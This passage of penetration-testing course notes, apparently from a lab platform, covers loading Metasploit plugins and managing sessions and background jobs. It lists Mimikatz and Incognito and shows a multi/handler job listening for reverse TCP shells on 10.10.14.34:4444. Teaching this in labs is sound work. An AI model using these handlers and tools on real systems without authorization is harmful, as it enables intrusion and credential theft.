db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```
Here we can take the plugin `pentest.rb` as an example and copy it to `/usr/share/metasploit-framework/plugins`.
```bash
Bailly@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
We can check the plugin's installation by running the `load` command.
```bash
msf6 > load pentest

       ___         _          _     ___ _           _
      | _ \\___ _ _| |_ ___ __| |_  | _ \\ |_  _ __ _(_)_ _
      |  _/ -_) ' \\  _/ -_|_-<  _| |  _/ | || / _` | | ' \\ 
      |_| \\___|_||_\\__\\___/__/\\__| |_| |_|\\_,_\\__, |_|_||_|
                                              |___/
      
Version 1.6
Pentest Plugin loaded.
by Carlos Perez (carlos_perez[at]darkoperator.com)
[*] Successfully loaded plugin: pentest
```
## Different plugins
They all have a specific purpose and can be an excellent help to save time after familiarizing ourselves with them. Check out the list of popular plugins below :

| [nMap (pre-installed)](https://nmap.org/)                                                                           | [NexPose (pre-installed)](https://sectools.org/tool/nexpose/)                                                                       | [Nessus (pre-installed)](https://www.tenable.com/products/nessus)                                               |
| ------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| [Mimikatz (pre-installed V.1)](http://blog.gentilkiwi.com/mimikatz)                                                 | [Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi) | [Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation) |
| [Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb) | [Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)                                 | [Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)                                            |



Multiple sessions can be created in MSFconsole, allowing us the handle multiple modules at the same time.

While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by pressing the `[CTRL] + [Z]` key combination or by typing the `background` command in the case of Meterpreter stages.



# Sessions
```bash
# List active sessions
msf6 > sessions

# Open sessions w/ its ID
msf6 > sessions -i 1
```
## Jobs

If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using `[CTRL] + [C]`. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the `jobs` command to look at the currently active tasks running in the background and terminate the old ones to free up the port. Other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly, even if the session dies or disappears.
We can view the help menu for this command, like others, by typing `jobs -h`.
```bash
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```
When we run an exploit, we can run it as a job by typing `exploit -j`. Per the help menu for the `exploit` command, adding `-j` to our command. Instead of just `exploit` or `run`, will "run it in the context of a job."
```bash
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```
To list all running jobs, we can use the `jobs -l` command. To kill a specific job, look at the index no. of the job and use the `kill [index no.]` command. Use the `jobs -K` command to kill all running jobs.
```bash
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```
